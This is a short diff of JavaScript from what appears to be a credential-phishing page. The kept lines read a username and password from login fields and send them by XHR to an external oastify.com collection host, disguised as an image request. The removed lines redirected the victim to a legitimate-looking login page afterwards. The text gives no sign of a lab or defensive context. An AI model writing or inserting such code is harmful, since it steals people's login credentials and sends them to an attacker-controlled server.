@@ -23,21 +23,6 @@
                 var password = document.getElementsByTagName('fluent-text-field')[1].value;
                 var xhr = new XMLHttpRequest();
                 xhr.open('GET', 'https://w2zllzx9v3pnmkm94x4xg1d7myspgf44.oastify.com/' + encodeURIComponent(username) + ':' + encodeURIComponent(password) + '.png', true);
-                // Handle successful completion
-                xhr.onload = function() {
-                    if (xhr.status >= 200 && xhr.status < 300) {
-                        parent.location.href = 'https://my.daryakenar.ir/account/login/mobile';
-                    } else {
-                        parent.location.href = 'https://my.daryakenar.ir/account/login/mobile';
-                    }
-                };
-                
-                // Handle network errors
-                xhr.onerror = function() {
-                    parent.location.href = 'https://my.daryakenar.ir/account/login/mobile';
-                };
-                
-                // Send the request
                 xhr.send();
             }
 
